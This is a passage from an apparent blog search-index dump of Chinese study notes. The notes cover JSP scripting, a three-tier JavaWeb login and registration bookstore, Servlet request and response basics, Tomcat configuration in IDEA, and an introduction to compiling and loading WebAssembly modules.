可以发现定义的东西一模一样的输出到了Java源文件里面。 声明静态代码块 1234static&#123; map &#x3D; new HashMap&lt;String, Object&gt;(); map.put(&quot;key1&quot;, &quot;value1&quot;);&#125; 声明方法 123public int abc()&#123; return 1;&#125; 声明内部类 1234public static class A &#123; private Integer id &#x3D; 12; private String name &#x3D; &quot;ggy&quot;;&#125; 将它们放在JSP文件里面，使用&lt;%! %&gt;即可。 表达式脚本表达式脚本可以在JSP页面上输出数据。使用：&lt;%=表达式 %&gt; 注意map对象，静态代码块里面实例化的，定义的时候也需要static。访问JSP页面 查看JAVA源文件 都是直接调用out.print打印的。 特点 所有的表达式脚本都是输出到jspService方法中的，因此jspService()中的对象、方法等在表达式脚本里边都可以调用。 表达式脚本都会被翻译成out.print打印输出到页面。 表达式脚本中的表达式不能以分号结束。 调用jspService的request对象 访问： http://localhost:8080/Jsp/test.jsp?username=ggy 如果表达式以分号结束 访问JSP页面，报错了，查看Java源文件 很明显看到错误。因为表达式都是在out.print里面的，就是参数传进print函数，没有分号。 代码脚本就是写Java代码，格式：&lt;% %&gt; if语句 如果是i==1可以，如果是if(i)会报错。在Java源文件里面 原样输出。同样是在jspService方法里面，也可以调用request对象等。可以用分号！ 重点是循环，与Jsp嵌套 for循环 for循环可以被jsp语句隔开，并不会影响它的完整性。 其实跟PHP那种写法一样的。访问jsp 刚开始很难理解，但是去看Java源文件后 要时刻记住，jsp的html语句会被翻译成out.write(xxx)，这样的效果就是循环打印了。","categories":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}],"tags":[{"name":"JavaWeb学习","slug":"JavaWeb学习","permalink":"https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}]},{"title":"JavaWeb学习(3)","slug":"JavaWeb学习-3","date":"2021-05-04T05:00:32.000Z","updated":"2021-05-07T02:39:57.243Z","comments":true,"path":"2021/05/04/JavaWeb学习-3/","link":"","permalink":"https://ggyggy666.github.io/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/","excerpt":"今天学习书城项目的功能的编写。","text":"今天学习书城项目的功能的编写。 JavaEE三层架构 客户端发送请求给服务端，服务端有三层，首先是Web层，负责封装请求，然后调用业务层的service处理业务；接着是业务层，负责处理业务请求，然后调用数据库进行存储；最后是持久层，负责与数据库进行交互。当然，这还得有个数据库才行。最后web层响应数据给客户端。 因此，一个完整的前后端项目需要的包为： web层 com.JavaWeb.web/servlet/controller service层 com.JavaWeb.service service接口包 service层 com.JavaWeb.service.impl service接口实现包 dao持久层 com.JavaWeb.dao dao接口包 dao持久层 com.JavaWeb.dao.impl dao接口实现类 实体bean对象 com.JavaWeb.pojo/entity/domain/bean JavaBean类 测试包 com.JavaWeb.test/unit 工具类 com.JavaWeb.utils 注意：在com.JavaWeb上新建package后得到service包，然后在service包上新建package得到service.impl包。最后只显示了service.impl包。 数据库需要先搭建好数据库并进行操作。 MySQL创建数据库和表首先打开PHP Study的MySQL数据库，然后在PHP Study的设置中 图中是Mysql8.0的，但是最后使用的是5.7。打开MySql的安装目录，进入到bin目录下，可以发现存在mysql.exe。因此将此时所在目录添加到环境变量。然后命令行中：mysql -uroot -p, 输入密码即可连接到数据库。 创建book数据库 12create database book;use book; 创建表 12345create table user( &#96;id&#96; int primary key auto_increment, &#96;username&#96; varchar(20) not null unique, &#96;password&#96; varchar(32) not null, &#96;email&#96; varchar(200)); 插入数据 1insert into user(&#96;username&#96;,&#96;password&#96;,&#96;email&#96;) values (&#39;admin&#39;,&#39;ggy666&#39;,&#39;123@qq.com&#39;); 查看数据 1select * from user; 编写数据库表对应的JavaBean对象Bean对象在pojo包下创建。创建一个类User，对应数据库的user表。 首先编写4个变量，然后右键点击Generate，点击Getter and Setter, 就会生成get和set的方法。继续右键单击Generate，点击toString方法，然后是一个空的Constructor, 最后是4个变量的Constructor。 编写工具类获取数据库连接和关闭工具类包是Utils，在其下新建一个类JdbcUtils 有两个方法，获取数据库连接和关闭数据库连接。 要连接数据库，还需要一个数据库的配置文件，应该在src目录下新建一个文件：jdbc.properties 然后在JdbcUtils.java中去读取配置文件 注意，需要导入两个jar包 用的连接Mysql包是5.几的版本，因此需要使用Mysql5.x的版本。最开始使用的是8.x的，报错了。 实现创建连接对象和关闭连接的函数 到Test包里写一个测试类JdbcUtilsTest，测试能否顺利连接数据库 返回了连接数据库的对象。 编写BaseDao类操作数据库在dao.impl包下新建一个BaseDao类，这个类是抽象类。需要先下载一个common-dbutils-1.3 jar, 并导入进来。 首先创建一个QueryRunner对象，它就是用来执行sql语句的。 然后是update方法，传sql语句以及参数进去，先连接数据库，然后执行sql语句。它可以进行增删改操作。同理 它可以执行查询sql语句后返回一条数据 这个可以返回多条数据 这个可以返回一行一列的数据。 编写UserDao接口类根据前端的功能，需要进行相应的数据库操作。上面已经实现了数据库操作方法，UserDao就是提供了一个接口去根据相应功能操作数据库。 首先在dao.impl包下，新建一个UserDao接口。 但是UserDao需要在dao下，而不是dao.impl下，因此将impl删除。 报错了，点击错误，选择移动即可 填写上接口 一个是根据用户名查询用户信息，用来注册时检查用户名是否已经存在； 一个是根据用户名和密码查询用户信息，用来检查登陆信息是否正确； 最后是保存用户信息。用来注册用户。 编写UserDaoImpl实现类继承BaseDao类，实现UserDao类，去实现3个功能接口。 在dao的impl下新建UserDaoImpl类 选择三个接口函数后确认。 实现三个接口。之后要测试这三个接口，可以到UserDao接口类中，按Ctrl+Shift+T 点击 按图中选择，确定 新建UserDao对象，调用方法，查询admin记录 成功查询。最后完善方法 编写UserService接口类该接口提供处理业务的功能。在service.impl下新建一个接口类UserService, 同样在package中去掉impl, 然后点击错误处理的小灯，移动即可。 写了三个接口，注册，登陆，判断用户是否存在。 编写UserServiceImpl实现类在service的impl下新建，然后Ctrl+O，点击三个接口并确认，实现 之后测试三个接口，同样切换到UserService接口类中，Ctrl+Shift+T 填写函数 编写一个注册页面在web目录下新建user目录，然后新建regist.html 访问：http://localhost:8080/book/user/regist.html 编写注册RegistServlet类在web包下新建一个RegistServlet类（注意，首字母要大写，小写了在web.xml没找到…) web.xml中配置访问路径 继续完善RegistServlet 首先检查验证码是否正确 不正确就跳转回注册界面。正确之后 先检查用户名是否存在 首先创建UserService对象，然后调用isExistName方法。注意需要throws SQLException，用户名存在还是转发回注册页面，否则就注册，插入数据： 然后跳转到登录界面。但是这时候抛出的SQLException出错了。将它删除，然后鼠标移到红线的函数，按提示增加try-catch。 编写登陆界面先去user目录下新建一个login.html 与注册页面差不多，只是不用邮箱了，改为了登陆页面。 重新部署，然后访问 输入没有存在的用户名注册 成功跳转到了登陆页面。 编写LoginServlet登陆类类似注册类。首先在web下新建一个LoginServlet类，然后配置web.xml 登陆页面login.html的表单的action也应该修改 实现LoginServlet类 首先判断验证码是否正确，正确就判断用户名和密码是否正确，正确就进入index.html。 这里必须要注意，之前那个userService.login函数有问题，它返回的是void类型。因此我将它改成了boolean型，如下 这是在UserServiceImpl里的。因此UserService接口类也需要改成boolean型 还需要编写一个index.html 之后重新部署，访问登陆界面：http://localhost:8080/book/user/login.html 登陆成功。 debug调试首先停止tomcat服务后，点击debug启动 启动之后一样会打开浏览器访问book工程，即正常运行。在注册类的开头下一个断点 然后访问注册页面：http://localhost:8080/book/user/regist.html，输入信息 点击提交后，浏览器在转圈，看IDEA 程序停在了断点处，并出现了debug信息。 查看调试相关的按钮 1：运行到下一行。 2：进入自己写的函数体部分。比如运行到一个getConnection()函数处，按下2，就会打开这个函数所在的文件，并定位到该函数的实现位置。注意必须是自己写的，不是系统函数。 3：强制进入函数体部分，包括系统函数。 4：退出函数体查看，返回上一个文件调用该函数的位置。 5：不太清楚。应该是打开文件，定位到当前所在行的所在函数的定义处 6：鼠标点到哪一行，按下6后就会运行到那一行的位置。 这个是运行的函数的堆栈信息。下面的函数调用上面的函数。 分别是停止服务，运行到下一个断点处，临时取消所有断点运行。 总结该书城注册和登陆完全就是照着JavaEE的三层架构写的。 首先是数据库和表，使用Mysql建立了book数据库和user表，并添加了数据。 针对User表，有4个数据，在pojo包下建立了User类，这个类作为JavaBean对象，可以让其它类访问或者设置里面的4个数据。用法是：传4个数据进去给构造函数new一个user对象出来，就可以直接传递这个user对象，其它类获取这个对象后就可以得到4个数据。 然后是Dao层。有BaseDao类和UserDao接口及UserDaoImpl实现类。BaseDao类只针对数据库操作，增删改查并返回数据。UserDao接口就要考虑到实际需要用到数据库的功能，因此定义了注册和登陆，查询用户是否存在3个接口。UserDaoImpl就负责调用BaseDao的方法去实现。 接着是业务层。在service包下有UserService接口和实现类。接口就要处理业务，而处理业务就需要用到数据库。业务有3个，注册和登陆，查询用户是否存在。实现接口就只需要去调用UserDaoImpl中的方法即可。 之后就是web层。有注册和登陆类。因为是web层，类就首先解析请求中的数据，将一些数据(如username, password)传进service层的方法去查询数据库得到结果，并与解析出来的一些数据进行对比。 最后就是前端的注册和登陆界面了。","categories":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}],"tags":[{"name":"JavaWeb学习","slug":"JavaWeb学习","permalink":"https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}]},{"title":"JavaWeb学习(2)","slug":"JavaWeb学习-2","date":"2021-05-02T15:01:21.000Z","updated":"2021-05-03T10:27:40.079Z","comments":true,"path":"2021/05/02/JavaWeb学习-2/","link":"","permalink":"https://ggyggy666.github.io/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/","excerpt":"今天继续学习JavaWeb的Servlet.","text":"今天继续学习JavaWeb的Servlet. ServletConfig类通常用于初始化获取配置文件web.xml中的值，该类的作用： 获取web.xml中Servlet-name的值。 获取web.xml中init-param的初始化参数名对应的值 获取ServletContext对象 首先看到HelloServlet类的init函数 可以发现传进来的就是ServletConfig对象。 要获取init-param初始化参数，还需要在web.xml中先定义 注意是写在servlet中的。代码如下 之后重启tomcat，访问hello 当然ServletConfig类也可以在其它地方使用，只需要建立一个对象即可。如在HelloServlet2中： 如果要访问init-param，则需要在web.xml的HelloServlet2的Servlet中添加。 这里注意，如果HelloServlet2要重写init函数，需要先实现父类 这是因为HelloServlet2继承的是HttpServlet, 需要super, 而HelloServlet是实现Servlet，不是继承，因此不用super。 ServletContext类定义上面说了ServletConfig可以通过getServletContext()方法获得ServletContext对象。那么什么是ServletContext？ 它是一个接口，表示Servlet的上下文对象；一个Web工程只有一个ServletContext对象实例；ServletContext对象是一个域对象。 域对象：可以像map一样存储数据，域指存储的数据的操作范围，即整个web工程。 作用 能够获取web.xml中上下文参数的值 能够获取当前工程名字 能够获取当前工程在硬盘中的真实路径 能够像map一样存储数据。注意，这个对象是存在于整个web工程的，任何Servlet去访问它都是同一个对象，因此存储的数据也是共享的。 前3个作用： 首先新建一个ContextServlet, 然后web.xml中配置访问路径以及context-param 注意，这个context-param不属于任何servlet，它只属于这个工程。上下文对象只能访问context-param, 不能访问其它servlet中的init-param。 特别要注意获取真实路径，参数是”/“, 说明是当前工程真实路径的根目录 它的内容对应着IDEA中的web目录。如果要获取web目录下的WEB-INF的真实路径，那么就应该这样写： 1System.out.println(&quot;WEB-INF的真实路径是：&quot; + context.getRealPath(&quot;&#x2F;WEB-INF&quot;)); 存储数据： 首先还是新建ContextServlet1, web.xml中配置访问路径 获取ServletContext对象，这次不用通过ServletConfig类获取，可以直接通过getServletContext()得到 在存储前先获取一下数据，存储后再获取数据，对比： 第一个是null, 存储之后就得到数据了。再新建一个ContextServlet2 重新部署，然后访问context2, 发现是null值。再去访问context1, 发现先是null, 存储数据后是ggy666。再去访问context2，发现已经不是null值了，而是ggy666。 由此可说明：ServletContext对象存储的数据生存期是在一次部署期间，重新部署后会被销毁，数据也就没有了。而一旦在部署期间，存储了数据之后，在其它Servlet也能访问到该对象存储的数据。 常见MIME类型 HttpServletRequest类请求进入tomcat服务器后，服务器会将请求封装到Request对象中，然后传递到service方法（doGet()和doPost())中。我们就可以通过doGet的参数里的HttpServletRequest对象调用方法获取请求信息。 常用方法12345678910getRequestURI() &#x2F;&#x2F;获取请求的资源路径（相对）getRequestURL() &#x2F;&#x2F;获取请求的资源路径（绝对）getRemoteHost() &#x2F;&#x2F;获取请求的IPgetHeader(请求头) &#x2F;&#x2F;获取请求头getParameter(参数名) &#x2F;&#x2F;获取请求的参数getParameterValues(参数名) &#x2F;&#x2F;获取请求的参数值（多个）getMethod() &#x2F;&#x2F;获取请求的方法setAttribute(key, value) &#x2F;&#x2F;设置存储数据getAtrribute(key) &#x2F;&#x2F;通过key获取对应的值getRequestDispatcher() &#x2F;&#x2F;获取转发对象 注意getParameter和getParameterValues的用法 new一个module，然后new一个Serlvet，配置好访问路径 在doGet方法中测试方法 编辑配置 运行 可以注意到getParameterValues并没有正确使用。需要如下使用： 加上Arrays.asList，将获取到的数据转为列表形式才行。然后重新部署后访问： 1http:&#x2F;&#x2F;localhost:8080&#x2F;HttpServlet&#x2F;httpServlet?a&#x3D;test&amp;a&#x3D;123 &#x2F;&#x2F;a有多个值 但是注意，POST请求中获取参数时如果是中文时会乱码，此时需要设置编码 首先写一个post请求的表单 java类中填写doPost 重新部署，访问：http://localhost:8080/HttpServlet/test.html 点击提交后 乱码了。需要设置编码 设置编码必须在开头就设置。 请求转发客户端发送给服务端的servlet后，该servlet又转发给另一个servlet，从而达到一次请求有多个servlet处理的效果。 新建servlet1和servlet2，并配置好web.xml 在servlet1中 首先获取请求的参数，然后设置一个域对象数据，然后转发请求。注意，转发请求时，需要转发的目的的相对路径（web.xml)中配置的路径，而不是类名，因此这里是/servlet2。 servlet2中 首先获取请求的参数，然后获取request对象的域数据，判断servlet1是否已经处理过，然后servlet2处理。 访问servlet1：http://localhost:8080/HttpServlet/servlet1?username=root 成功转发并接收。 需要注意点是： 虽然使用两个servlet处理，但是浏览器地址没有变化，还是访问的servlet1. 只是一次请求。 共享Request对象域中的数据。 浏览器直接访问WEB-INF目录下的文件是404的，如果转发请求的话，可以转发到WEB-INF目录下的文件。 不能转发到工程外的文件。 base标签的作用base标签是用来作为参照的路径的，请求转发是使用相对路径的，如果没有参照的基地址路径，很容易造成地址错误。 在web目录下新建一个目录a, a下新建一个目录b, b下新建一个c.html 可以跳回test.html, 然后修改test.html 然后访问：http://localhost:8080/HttpServlet/test.html 两个HTML文件可以互相成功跳转。但是如果使用请求转发的方式就会出现问题： 新建Servlet：ForwardC 将请求转发到a/b/c.html中。web.xml配置路径 修改test.html 因此可知，test.html跳转到FowardC, 然后FowardC将请求转发到c.html, 之后在c.html中点击跳转回test.html，然鹅真能跳回？ 这是因为请求转发时候，转发跳转到了c.html, 但是URL地址并没有变化 http://localhost:8080/HttpServlet/ForwardC 还是ForwardC, 因此导致了c.html中跳转回test.html的../../test.html失败，地址变成了： http://localhost:8080/test.html 因此需要base标签确定跳转的参照地址 在c.html中 即可成功跳转。 HttpServletResponse类与Request一样，请求进来后，tomcat服务器都会生成一个Response对象，作为参数传到doGet或doPost中供我们使用。之前的输出都是在IDEA中打印的，而这个Response可以向客户端返回数据显示在客户端。 getWriter()，字符流，返回字符串数据。 getOutputStream(), 字节流，返回的是二进制数据，通常用于下载。 两种方法同时只能用其一。 返回数据新建一个Response类，同时配置好访问路径，在类中的doGet方法中响应返回字符串数据。 访问之后即可看到返回的数据。 如果是中文的话会乱码，因此还需要设置字符集是UTF-8.浏览器编码也要设置哦。 另有一个方法可以同时设置响应和浏览器编码 1resp.setContentType(&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;) 设置编码一定要在获取流对象即getWriter()方法之前使用。 请求重定向第一种方案 客户端向服务器发起一个请求，服务器响应时，将状态码修改成302，设置响应头是Location: URL, 这样客户端接受后就会重定向到新的URL地址。 新建Response1和Response2，配置web.xml的访问路径 重新部署，然后访问response1 成功跳转到了Response2。 特点： URL地址变化 两次请求 不能共享域中的数据 不能跳转到WEB-INF中的资源文件 可以跳转到工程外的域名 第二种方案 直接使用： 1resp.sendRedirect(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)","categories":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}],"tags":[{"name":"JavaWeb学习","slug":"JavaWeb学习","permalink":"https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}]},{"title":"JavaWeb学习(1)","slug":"JavaWeb学习-1","date":"2021-05-01T10:04:38.000Z","updated":"2021-05-02T14:59:55.784Z","comments":true,"path":"2021/05/01/JavaWeb学习-1/","link":"","permalink":"https://ggyggy666.github.io/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/","excerpt":"今天开始好好学习JavaWeb。","text":"今天开始好好学习JavaWeb。 主要是配合IDEA使用。 环境配置IDEA添加tomcat前提：需要JAVA_HOME环境变量。 下载tomcat压缩包，解压后，在bin目录下点击startup.bat启动tomcat, 之后可以访问本地的8080端口看是否成功部署。成功后就可以关掉了。 IDEA中，进入settings设置，然后 浏览目录，找到tomcat的安装目录，并确认 自动显示出来了tomcat版本，确认后即可看到 新建JavaWeb工程点击File-&gt;new-&gt;new project，新建工程 按图中所示操作即可，之后next，输入项目名确认即可。 导入第三方库首先在WEB-INF目录下新建一个lib目录，用来保存jar包 导入第三方库有两种方法： 复制jar包，鼠标移到lib目录，右键选择粘贴。然后再移到jar包，右键，选择：Add as library 点击File-&gt;Project Structure 点击Libraries, 点击+ 选择Java，然后浏览到jar包位置 之后都是OK。然后点击Artifacts 点击Fix, 选择添加 OK之后可以在外部库中看到 修改tomcat配置点击tomcat的配置进行编辑 在Deployment中可以修改本项目的访问路径 最好与工程名一致，即JavaWeb 在server中可以修改端口与热部署 所谓热部署，就是在修改tomcat网页内容后，不用重启实例就能自动刷新网页。将On frame deactivation的值改为Update classes and resources就行。然后，On ‘Update’ action 修改为Restart server，意思是点击IDEA的tomcat的重启按钮时会默认显选中这个选项 Servlet相当于是服务器程序，可以接受请求并响应。 第一个Servlet程序在JavaWeb目录下，new一个Web Application模块，然后在src中新建package: com.JavaWeb.servlet, 在该包下新建一个类：HelloServlet 然后这个类需要实现Servlet, 即添加上implements Servlet, 之后可以Alt+Enter, 自动出现需要实现的方法 在service方法中，输出一句话。这样当访问这个Servlet时就能打印这句话。有了Servlet程序之后，还需要给它配置访问路径。在web.xml中 首先添加一个servlet标签，里面是容器名以及链接到的类。然后是添加servlet-mapping, 给这个servlet配置访问路径。同样是需要容器名，后面的url-pattern即为访问目录。完整URL应为：工程所在路径+url-pattern, 工程所在路径即为tomcat配置的路径 因此，访问：http://localhost:8080/JavaWeb/hello 输出日志将那句话打印了出来。 Servlet函数执行顺序首先Alt+Insert使用Generate功能为HelloServlet生成一个构造器，然后在构造函数、init、service、destroy函数下打印语句 重启之后连续访问：http://localhost:8080/JavaWeb/hello 可以发现，构造函数和init函数只在最初访问servlet时调用，之后调用的都是service方法，而destroy函数则在点击停止tomcat时调用 区分请求类型是GET还是POSTservlet相当于服务器，接受客户端发送来的请求，那么就要识别出它是哪一种请求。 首先创建一个test.html，模拟一个form表单提交请求 然后在Servlet的service中处理请求 这里有一个点，HttpServletRequest是继承了servletRequest的。 首先创建一个httpServletRequest对象，然后使用getMethod()即可获得请求的方法，然后使用equals判断该请求是哪种类型。 先使用get方法，再使用post方法测试。访问：http://localhost:8080/JavaWeb/test.html 点击页面的submit按钮 将处理的内容封装成一个函数，方便日后查看 继承HttpServlet通常在项目中，都不会直接使用实现Servlet，而是使用继承HttpServlet 同样在doGet()和doPost()方法中自定义代码 web.xml中配置路径 之后修改test.html的action为hello2, 启动tomcat，访问test.html, 点击提交 直接使用IDEA生成HttpServlet程序上述的HttpServlet程序需要手动生成，有点麻烦。IDEA提供了直接生成 new-&gt;Create New Servlet 然后填写Servlet的名称 直接出现了Servlet程序 同样在web.xml中配置路径即可 整个Servlet体系","categories":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}],"tags":[{"name":"JavaWeb学习","slug":"JavaWeb学习","permalink":"https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}]},{"title":"区块链安全之WebAssembly","slug":"区块链安全之WebAssembly","date":"2021-03-21T10:43:31.000Z","updated":"2021-03-23T04:27:03.075Z","comments":true,"path":"2021/03/21/区块链安全之WebAssembly/","link":"","permalink":"https://ggyggy666.github.io/2021/03/21/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BWebAssembly/","excerpt":"由于EOSIO在编译智能合约时会将CPP文件编译成wasm文件，因此需要好好了解一下wasm—WebAssembly。","text":"由于EOSIO在编译智能合约时会将CPP文件编译成wasm文件，因此需要好好了解一下wasm—WebAssembly。 概念WebAssembly是一种新型代码，是C/C++代码编译后的目标。它是一种低级汇编语言，表现为二进制格式，但也有可读的文本格式。它的速度快。 Module: 表示一个WebAssemble二进制文件，已被浏览器编译为可执行的机器码。 Memory：可调整大小的数组缓冲区。内含低级内存访问指令读取和写入的线性字节数组。 Table：可调整大小的类型化引用数组（如函数）。 Instance（实例): 一个模块，它与运行时使用的所有状态配对，包括内存，表和一组导入的值。 生成wasm代码的方式： 在线生成: https://wasdk.github.io/WasmFiddle/ https://anonyco.github.io/WasmFiddlePlusPlus/ https://mbebenita.github.io/WasmExplorer/ Emscripten工具: https://developer.mozilla.org/en-US/docs/Mozilla/Projects/Emscripten 这个功能更完善。 C/C++程序编译成wasm文件首先下载Emscripten工具： 12345678git clone https:&#x2F;&#x2F;gitee.com&#x2F;ggy666&#x2F;emsdk1.gitcd emsdk1#更新emsdkgit pull.&#x2F;emsdk install latest &#x2F;&#x2F;下载一堆必要的东西.&#x2F;emsdk activate latestsource .&#x2F;emsdk_env.sh 例子一hello.c 12345#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello World\\n&quot;);&#125; Emscripten编译 1emcc hello.c -s WASM&#x3D;1 -o hello.html -s WASM=1，指定需要输出wasm文件，否则它只会输出js文件。运行命令后会存在: hello.wasm, hello.js, hello.html。 在火狐或者谷歌浏览器直接打开hello.html, 由于使用的是file://协议，无法成功执行。 需要将该HTML文件，js文件和wasm文件三个都放到本地服务器之上，这里使用的是PHPStudy。然后浏览器中访问: http://127.0.0.1:xxxx/hello.html。 成功打印出来了。 使用自定义HTML模板还是hello2.c 12345#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello World\\n&quot;);&#125; 找到shell_minimal.html, 将其复制到html_template目录下。然后运行命令: 1emcc -o hello2.html hello.c -O3 -s WASM&#x3D;1 --shell-file html_template&#x2F;shell_minimal.html 使用了–shell-file指定了一个HTML模板，那么生成的hello2.html就是这个模板生成的。 调用C中定义的自定义函数hello3.c 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;emscripten&#x2F;emscripten.h&gt;int main() &#123; printf(&quot;Hello World\\n&quot;);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endifEMSCRIPTEN_KEEPALIVE void myFunction(int argc, char ** argv) &#123; printf(&quot;MyFunction Called\\n&quot;);&#125;#ifdef __cplusplus&#125;#endif 本来有效代码只有main函数，但是使用了EMSCRIPTEN_KEEPALIVE声明之后myFunction也是有效代码了。但是还需要设置NO_EXIT_RUNTIME=1, 不然main执行完后就退出了。 1emcc -o hello3.html hello3.c -O3 -s WASM&#x3D;1 --shell-file html_template&#x2F;shell_minimal.html -s NO_EXIT_RUNTIME&#x3D;1 -s &quot;EXTRA_EXPORTED_RUNTIME_METHODS&#x3D;[&#39;ccall&#39;]&quot; 照常打开hello3.html后，跟之前一样。要看到运行myFunction函数的效果，需要编辑器中打开hello3.html，（sublime text中打开的html文件代码全都是贴在一块的，需要prettify。https://www.jianshu.com/p/58265c587cbf） 首先加一个按钮: 1&lt;button class&#x3D;&quot;mybutton&quot;&gt;Run myFunction&lt;&#x2F;button&gt; 然后在按钮下方的script中添加script代码: 12345678910document.querySelector(&#39;.mybutton&#39;) .addEventListener(&#39;click&#39;, function() &#123; alert(&#39;check console&#39;); var result &#x3D; Module.ccall( &#39;myFunction&#39;, &#x2F;&#x2F; name of C function null, &#x2F;&#x2F; return type null, &#x2F;&#x2F; argument types null &#x2F;&#x2F; arguments ); &#125;); WebAssembly文本格式不管是二进制格式还是文本格式，WebAssembly的基本代码单元都是一个模块。表示为一个S表达式。其实就是个平面树的结构。 1(module (memory 1) (func)) 每个节点放在一对括号内，比如根节点就是module，子节点有两个，memory和func, 1是memory节点的属性。 模块中添加功能 1(func (签名) (本地类型声明) (body)) 签名其实也是参数类型声明，如果有返回值，后面还会跟返回类型声明。类型只有四种：i32, i63, f32, f63 1(func (param i32) (param i32) (result f64) (本地类型声明) (body)) 两个i32的参数，返回值是f64类型的。 本地类型声明实质是获取参数和返回值的类型。使用local.get 0这种，0代表第一个参数。 1234(func (param i32) (param f32) (local f64) local.get 0 &#x2F;&#x2F;i32 local.get 1 &#x2F;&#x2F;f32 local.get 2) &#x2F;&#x2F;f64 这种通过数字获取类型不太行，最好就是给每个参数都加一个名称，然后去get它。 1(func (param $p1 i32) (param $p2 f32) local.get $p1 local.get $p2 …) local.get是将获得的值压栈，出栈用add。 12345(func (param $p i32) (result i32) local.get $p local.get $p i32.add) 弹出两个i32值，如果是弹出f32, 使用f32.add 调用函数 1234567(module (func $add (param $lhs i32) (param $rhs i32) (result i32) local.get $lhs local.get $rhs i32.add) (export &quot;add&quot; (func $add))) 给func函数起名$add, 之后export中调用。将模块保存为add.wat, 之后wabt转换成add.wasm。 同一模块中的其它函数调用函数 1234567(module (func $getAnswer (result i32) i32.const 42) (func (export &quot;getAnswerPlus1&quot;) (result i32) call $getAnswer i32.const 1 i32.add)) 第二个函数调用第一个函数。 声明全局变量 12345678(module (global $g (import &quot;js&quot; &quot;global&quot;) (mut i32)) (func (export &quot;getGlobal&quot;) (result i32) (global.get $g)) (func (export &quot;incGlobal&quot;) (global.set $g (i32.add (global.get $g) (i32.const 1))))) 文本格式与二进制转换git下载 git clone --recursive https://gitee.com/ggy666/wabt.git github原因之后有好几个都下载不了，只能去到GitHub下载下来然后复制到third_party。之后执行 123mkdir build &amp;&amp; cd buildcmake ..cmake --build . 但还是报错。。莫得办法了。 wast-&gt;wasm: https://cdn.rawgit.com/WebAssembly/sexpr-wasm-prototype/2bb13aa785be9908b95d0e2e09950b39a26004fa/demo/index.html wasm-&gt;wast: https://webassembly.github.io/wabt/demo/ 二进制格式WebAssembly, 使用LEB128编码，因此有效位是7位，剩余一位表示是否终结的标志位。如果标志位是1，表示编码的数据还没结束。 wasm是二进制格式，采用小端存储。 参考这个解析:https://www.jianshu.com/p/2f18b33ee389 下面段截图来源: https://cdn.rawgit.com/WebAssembly/sexpr-wasm-prototype/2bb13aa785be9908b95d0e2e09950b39a26004fa/demo/index.html 与解析有出入，所以看得不太懂。 段类型模块主要由多个段组成。每个段对应一个ID。 ID 段 用处 ０ 自定义段 用于存储调试信息 １ 类型段（Type） 存储导入函数，模块内部函数的函数参数列表 ２ 导入段（import） 存储导入函数的名称，参数索引 ３ 函数段（Function） 存储函数索引值 ４ 表格段（Table） 存储对象引用，实现函数指针功能，可导入也可导出 ５ 内存段（Memory） 存储程序运行时动态数据，可导入导出 ６ 全局段（Global） 存储全部变量值 ７ 导出段（Export） 存储导出函数的名称，参数索引 ８ 开始段（Start） 指定模块初始化时的函数索引值 ９ 元素段（Elem） 表格段没有显式初始化，存储函数的索引值 １０ 代码段（Code） 存储函数的指令代码 １１ 数据段（Data） 存储初始化内存的静态数据 头部头部有8字节，前四个字节是：00 61 73 6d, 对应字符串“\\x00asm”, 其实就是0x6d736100。后面四个字节代表版本号。 自定义段还没有。 类型段 函数段 导入段 导出段 代码段 表格段 内存段 开始段 数据段 使用XMLHttpRequest调用wasmhtml文件如下: 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;xhr&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;p&gt;test&lt;&#x2F;p&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; var importObject &#x3D; &#123; imports:&#123; imported_func: function(arg)&#123; console.log(arg); &#125; &#125; &#125; request &#x3D; new XMLHttpRequest(); request.open(&#39;GET&#39;, &#39;simple.wasm&#39;); request.responseType &#x3D; &#39;arraybuffer&#39;; request.send(); request.onload &#x3D; function() &#123; var bytes &#x3D; request.response; WebAssembly.instantiate(bytes, importObject).then(results &#x3D;&gt; &#123; results.instance.exports.exported_func(); &#125;); &#125;; &lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 注意，需要先创建一个importObject才行，而且它要满足wasm里的内容。也就是说，换一个wasm会运行错误的。 看一下simple.wasm内容: 123450061 736d 0100 0000 0108 0260 017f 00600000 0219 0107 696d 706f 7274 730d 696d706f 7274 6564 5f66 756e 6300 0003 02010107 1101 0d65 7870 6f72 7465 645f 66756e63 0001 0a08 0106 0041 2a10 000b 转成wat看一下： 1234567(module (type $t0 (func (param i32))) (type $t1 (func)) (import &quot;imports&quot; &quot;imported_func&quot; (func $imports.imported_func (type $t0))) (func $exported_func (export &quot;exported_func&quot;) (type $t1) (call $imports.imported_func 